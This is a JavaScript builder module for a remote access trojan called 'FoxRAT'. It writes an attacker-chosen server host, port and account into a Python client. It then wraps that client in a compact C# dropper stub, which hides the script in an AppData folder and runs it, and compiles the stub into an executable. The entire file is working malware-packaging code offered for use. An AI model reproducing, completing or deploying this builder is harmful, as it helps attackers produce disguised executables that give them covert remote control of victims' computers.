// Builder helper - tries Mono C# compilation, falls back to .py
const { execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

exports.build = function(options) {
    const { filename, host, port, account } = options;
    const safeName = (filename || 'FoxRAT').replace(/[^a-zA-Z0-9_-]/g, '') || 'FoxRAT';
    const outName = safeName + '.exe';
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'foxrat_build_'));
    const clientPyPath = path.join(__dirname, 'client_py', 'client.py');
    const clientSource = fs.readFileSync(clientPyPath, 'utf8');

    const modified = clientSource
        .replace(/SERVER_HOST = ".*?"/, `SERVER_HOST = "${host || '127.0.0.1'}"`)
        .replace(/SERVER_PORT = \d+/, `SERVER_PORT = ${Number(port) || 3000}`)
        .replace(/ACCOUNT = ".*?"/, `ACCOUNT = "${account || 'default'}"`);

    fs.writeFileSync(path.join(tmpDir, 'client.py'), modified);

    const csCode = `using System;using System.Diagnostics;using System.IO;using System.Reflection;class P{static void Main(){string d=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),".foxdata");Directory.CreateDirectory(d);string f=Path.Combine(d,"c.py");Assembly.GetManifestResourceStream("c.py").CopyTo(new FileStream(f,FileMode.Create));try{Process.Start("python",f).WaitForExit();}catch{try{Process.Start("python3",f).WaitForExit();}catch{try{Process.Start("py",f).WaitForExit();}catch{}}}}`;
    fs.writeFileSync(path.join(tmpDir, 'stub.cs'), csCode);

    let compiled = false;
    try {
        execSync(`mcs -target:exe -out:"${outName}" stub.cs -resource:client.py:c.py`, { cwd: tmpDir, timeout: 30000, stdio: 'pipe' });
        compiled = fs.existsSync(path.join(tmpDir, outName));
    } catch(_) {}

    if (!compiled) {
        try {
            execSync(`csc /target:exe /nologo /out:"${outName}" stub.cs /resource:client.py:c.py`, { cwd: tmpDir, timeout: 30000, stdio: 'pipe' });
            compiled = fs.existsSync(path.join(tmpDir, outName));
        } catch(_) {}
    }

    let result;
    if (compiled) {
        result = { data: fs.readFileSync(path.join(tmpDir, outName)), ext: '.exe' };
    } else {
        result = { data: Buffer.from(modified, 'utf8'), ext: '.py' };
    }

    fs.rmSync(tmpDir, { recursive: true, force: true });
    return result;
};
